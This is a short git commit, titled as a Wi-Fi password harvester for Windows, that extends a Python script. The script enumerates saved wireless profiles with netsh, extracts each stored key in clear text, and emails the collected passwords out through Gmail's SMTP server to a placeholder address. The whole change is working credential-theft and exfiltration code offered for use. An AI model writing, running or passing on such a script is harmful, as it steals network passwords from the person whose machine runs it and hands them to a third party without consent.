aa3a4e421033115e27a508bfbcfb9045de5f3a8c
Shivam Singh <dreamyshivam01@gmail.com>
2025-02-25 23:04:50 +0530

    WI-FI passwords harvester for windows

--- execute_and_report_win.py
+++ execute_and_report_win.py
@@ -1,4 +1,4 @@
-import subprocess , smtplib
+import subprocess , smtplib , re
 
 def send_mail(email, password, message):
     server = smtplib.SMTP("smtp.gmail.com", 587)
@@ -8,7 +8,15 @@ def send_mail(email, password, message):
     server.quit()
 
 command = "netsh wlan show profile"
-result = subprocess.check_output(command, shell=True)
+networks = subprocess.check_output(command, shell=True)
+network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
+
+result = ""
+
+for network_name in network_names_list:
+    command = "netsh wlan show profile " + network_name + " key=clear"
+    current_result = subprocess.check_output(command, shell=True)
+    result = result + current_result
 
 send_mail("EMAIL", "APP PASS FOR EMAIL", result)
 # This script will send an email to the specified email address with the results of the command.
